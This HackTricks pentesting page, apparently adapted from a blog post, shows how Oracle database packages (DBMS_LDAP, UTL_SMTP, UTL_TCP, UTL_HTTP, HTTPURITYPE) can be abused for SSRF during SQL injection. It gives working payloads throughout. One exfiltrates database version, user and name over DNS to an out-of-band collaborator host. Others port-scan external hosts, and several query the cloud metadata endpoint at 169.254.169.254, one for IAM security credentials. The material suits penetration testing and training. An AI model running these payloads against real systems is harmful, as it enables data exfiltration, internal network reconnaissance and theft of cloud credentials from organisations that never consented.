# Oracle injection

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## SSRF

Using Oracle to do Out of Band HTTP and DNS requests is well documented but as a means of exfiltrating SQL data in injections. We can always modify these techniques/functions to do other SSRF/XSPA.

Installing Oracle can be really painful, especially if you want to set up a quick instance to try out commands. My friend and colleague at [Appsecco](https://appsecco.com), [Abhisek Datta](https://github.com/abhisek), pointed me to [https://github.com/MaksymBilenko/docker-oracle-12c](https://github.com/MaksymBilenko/docker-oracle-12c) that allowed me to setup an instance on a t2.large AWS Ubuntu machine and Docker.

I ran the docker command with the `--network="host"` flag so that I could mimic Oracle as an native install with full network access, for the course of this blogpost.

```
docker run -d --network="host" quay.io/maksymbilenko/oracle-12c 
```

#### Oracle packages that support a URL or a Hostname/Port Number specification <a href="#oracle-packages-that-support-a-url-or-a-hostname-port-number-specification" id="oracle-packages-that-support-a-url-or-a-hostname-port-number-specification"></a>

In order to find any packages and functions that support a host and port specification, I ran a Google search on the [Oracle Database Online Documentation](https://docs.oracle.com/database/121/index.html). Specifically,

```
site:docs.oracle.com inurl:"/database/121/ARPLS" "host"|"hostname" "port"|"portnum"
```

The search returned the following results (not all can be used to perform outbound network)

* DBMS\_NETWORK\_ACL\_ADMIN
* UTL\_SMTP
* DBMS\_XDB
* DBMS\_SCHEDULER
* DBMS\_XDB\_CONFIG
* DBMS\_AQ
* UTL\_MAIL
* DBMS\_AQELM
* DBMS\_NETWORK\_ACL\_UTILITY
* DBMS\_MGD\_ID\_UTL
* UTL\_TCP
* DBMS\_MGWADM
* DBMS\_STREAMS\_ADM
* UTL\_HTTP

This crude search obviously skips packages like `DBMS_LDAP` (which allows passing a hostname and port number) as [the documentation page](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360) simply points you to a [different location](https://docs.oracle.com/database/121/ARPLS/d\_ldap.htm#ARPLS360). Hence, there may be other Oracle packages that can be abused to make outbound requests that I may have missed.

In any case, let’s take a look at some of the packages that we have discovered and listed above.

**DBMS\_LDAP.INIT**

The `DBMS_LDAP` package allows for access of data from LDAP servers. The `init()` function initializes a session with an LDAP server and takes a hostname and port number as an argument.

This function has been documented before to show exfiltration of data over DNS, like below

```
SELECT DBMS_LDAP.INIT((SELECT version FROM v$instance)||'.'||(SELECT user FROM dual)||'.'||(select name from V$database)||'.'||'d4iqio0n80d5j4yg7mpu6oeif9l09p.burpcollaborator.net',80) FROM dual;
```

However, given that the function accepts a hostname and a port number as arguments, you can use this to work like a port scanner as well.

Here are a few examples

```
SELECT DBMS_LDAP.INIT('scanme.nmap.org',22) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',25) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',80) FROM dual;
SELECT DBMS_LDAP.INIT('scanme.nmap.org',8080) FROM dual;
```

A `ORA-31203: DBMS_LDAP: PL/SQL - Init Failed.` shows that the port is closed while a session value points to the port being open.

**UTL\_SMTP**

The `UTL_SMTP` package is designed for sending e-mails over SMTP. The example provided on the [Oracle documentation site shows how you can use this package to send an email](https://docs.oracle.com/database/121/ARPLS/u\_smtp.htm#ARPLS71478). For us, however, the interesting thing is with the ability to provide a host and port specification.

A crude example is shown below with the `UTL_SMTP.OPEN_CONNECTION` function, with a timeout of 2 seconds

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',80,2);
END;
```

```
DECLARE c utl_smtp.connection;
BEGIN
c := UTL_SMTP.OPEN_CONNECTION('scanme.nmap.org',8080,2);
END;
```

A `ORA-29276: transfer timeout` shows port is open but no SMTP connection was estabilished while a `ORA-29278: SMTP transient error: 421 Service not available` shows that the port is closed.

**UTL\_TCP**

The `UTL_TCP` package and its procedures and functions allow [TCP/IP based communication with services](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). If programmed for a specific service, this package can easily become a way into the network or perform full Server Side Requests as all aspects of a TCP/IP connection can be controlled.

The example [on the Oracle documentation site shows how you can use this package to make a raw TCP connection to fetch a web page](https://docs.oracle.com/cd/B28359\_01/appdev.111/b28419/u\_tcp.htm#i1004190). We can simply it a little more and use it to make requests to the metadata instance for example or to an arbitrary TCP/IP service.

```
set serveroutput on size 30000;
SET SERVEROUTPUT ON 
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('169.254.169.254',80,tx_timeout => 2);
  retval := utl_tcp.write_line(c, 'GET /latest/meta-data/ HTTP/1.0');
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
/
```

```
DECLARE c utl_tcp.connection;
  retval pls_integer; 
BEGIN
  c := utl_tcp.open_connection('scanme.nmap.org',22,tx_timeout => 4);
  retval := utl_tcp.write_line(c);
  BEGIN
    LOOP
      dbms_output.put_line(utl_tcp.get_line(c, TRUE));
    END LOOP;
  EXCEPTION
    WHEN utl_tcp.end_of_input THEN
      NULL;
  END;
  utl_tcp.close_connection(c);
END;
```

Interestingly, due to the ability to craft raw TCP requests, this package can also be used to query the Instance meta-data service of all cloud providers as the method type and additional headers can all be passed within the TCP request.

**UTL\_HTTP and Web Requests**

Perhaps the most common and widely documented technique in every Out of Band Oracle SQL Injection tutorial out there is the [`UTL_HTTP` package](https://docs.oracle.com/database/121/ARPLS/u\_http.htm#ARPLS070). This package is defined by the documentation as - `The UTL_HTTP package makes Hypertext Transfer Protocol (HTTP) callouts from SQL and PL/SQL. You can use it to access data on the Internet over HTTP.`

```
select UTL_HTTP.request('http://169.254.169.254/latest/meta-data/iam/security-credentials/adminrole') from dual;
```

You could additionally, use this to perform some rudimentary port scanning as well with queries like

```
select UTL_HTTP.request('http://scanme.nmap.org:22') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:8080') from dual;
select UTL_HTTP.request('http://scanme.nmap.org:25') from dual;
```

A `ORA-12541: TNS:no listener` or a `TNS:operation timed out` is a sign that the TCP port is closed, whereas a `ORA-29263: HTTP protocol error` or data is a sign that the port is open.

Another package I have used in the past with varied success is the [`GETCLOB()` method of the `HTTPURITYPE` Oracle abstract type](https://docs.oracle.com/database/121/ARPLS/t\_dburi.htm#ARPLS71705) that allows you to interact with a URL and provides support for the HTTP protocol. The `GETCLOB()` method is used to fetch the GET response from a URL as a [CLOB data type.](https://docs.oracle.com/javadb/10.10.1.2/ref/rrefclob.html)[select HTTPURITYPE('http://169.254.169.254/latest/meta-data/instance-id').getclob() from dual;

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* Do you work in a **cybersecurity company**? Do you want to see your **company advertised in HackTricks**? or do you want to have access to the **latest version of the PEASS or download HackTricks in PDF**? Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **Join the** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** me on **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **and** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>
